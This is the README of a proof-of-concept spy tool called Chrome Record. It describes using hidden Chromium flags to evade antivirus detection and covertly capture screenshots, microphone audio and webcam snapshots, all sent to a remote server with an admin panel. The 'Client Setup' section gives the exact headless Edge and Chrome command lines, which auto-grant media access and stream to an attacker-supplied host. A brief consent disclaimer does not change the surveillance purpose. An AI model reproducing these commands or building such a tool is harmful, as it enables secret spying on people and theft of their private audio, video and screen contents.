# Chrome Record - Screen & Audio Recording System

Chrome-based POC of a spy tool that utilizes hidden Chromium flags to bypass antivirus detection, capture screenshots, and even record microphone audio — all in headless mode.

## Video-Demo:
https://www.youtube.com/watch?v=WqE3BpcCZvE

## Features

- **Screen Recording**: Captures screenshots every 10 seconds using Chrome's display recording API
- **Audio Recording**: Records microphone audio in 30-second chunks
- **Webcam Snapshots**: Manual webcam capture with minimal indication-light time
- **Client Identification**: Each connection gets a unique ID for tracking
- **Admin Panel**: Modern UI for viewing connections, recordings, and live streams
- **Session Management**: View and manage individual recording sessions
- **File Management**: Browse, view, play, and delete recordings
- **Real-time Statistics**: Live counters for active connections, sessions, screenshots, audio files, and webcam pictures
- **Low Memory Usage**: Optimized for minimal resource consumption
- **Real-time Updates**: WebSocket-based communication for data synchronization

## Prerequisites

- [Deno](https://deno.land/) installed on your system
  - **Installation**: Follow the [official Deno installation guide](https://docs.deno.com/runtime/getting_started/installation/)

## Installation & Setup

### 🚀 Quick Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/ne0YT/chromerecord/
   cd chromerecord
   ```

2. **Run the installation script**
   ```bash
   bash ./install.sh
   ```

3. **Configure reverse proxy with SSL + authentication**
   ⚠️ **Important**: Use a reverse-proxy with trusted SSL + auth for `/admin` directive for security.

### 🎛️ Service Management

Once installed, you can manage the application as a system service:

```bash
# 📜 View logs
tail -f /var/log/deno-app/output.log

# ▶ Start the service
sudo systemctl start deno-app

# ⏹ Stop the service
sudo systemctl stop deno-app

# 📋 Check status
sudo systemctl status deno-app
```

### 🔐 Admin Interface Access

Access the admin panel at:
```
https://YOURSERVER.TLD/admin
```

⚠️ **Security Note**: There is no built-in login function. Use a reverse-proxy with an auth module for `/admin` for proper authentication.

### 🖥️ Client "Setup" ;-) (Windows)

#### Microsoft Edge
```cmd
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --use-fake-ui-for-media-stream https://YOURSERVER.TLD
```

#### Google Chrome
```cmd
"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --use-fake-ui-for-media-stream https://YOURSERVER.TLD
```

## Usage

### Main Recording Page (`/`)
- Check Client "Setup"..
- Locally runs on `http://localhost:8000`
- Screen captures every 10 seconds
- Audio recorded in 30-second chunks

### Admin Panel (`/admin`)
- Navigate to `http://localhost:8000/admin`
- View all active connections
- Monitor recording statistics
- Browse and play back recorded files
- Real-time data synchronization

## Project Structure

```
chromerecord/
├── main.ts              # Main server file with Oak router and WebSocket
├── deno.json            # Deno configuration and dependencies
├── public/
│   ├── index.html       # Main recording page
│   └── admin.html       # Admin panel interface
├── recordings/          # Generated recordings directory
└── README.md           # This file
```

## API Endpoints

- `GET /` - Main recording page
- `GET /admin` - Admin panel
- `GET /api/connections` - List active connections
- `GET /recordings/:filename` - Download recorded files
- `DELETE /recordings/:filename` - Delete recorded files

## WebSocket Events

- **Client → Server**:
  - `{ type: "screenshot", data: "base64" }` - Screenshot data
  - `{ type: "audio", data: "base64" }` - Audio data

## Security Considerations

⚠️ **Important**: This application is designed for educational and authorized monitoring purposes only. Ensure you have proper consent and comply with local privacy laws before using.

- All recordings are stored locally
- No encryption by default
- Client identification via UUID
- No authentication implemented (add your own if needed)

## Troubleshooting

### Permission Denied Errors
Ensure Deno has the required permissions:
```bash
deno run --allow-net --allow-read --allow-write --allow-env --allow-run main.ts
```

### WebSocket Connection Issues
- Check if port 8081 is available
- Ensure firewall allows WebSocket connections
- Verify browser supports WebSocket

### Recording Not Working
- Ensure HTTPS in production (required for media APIs)

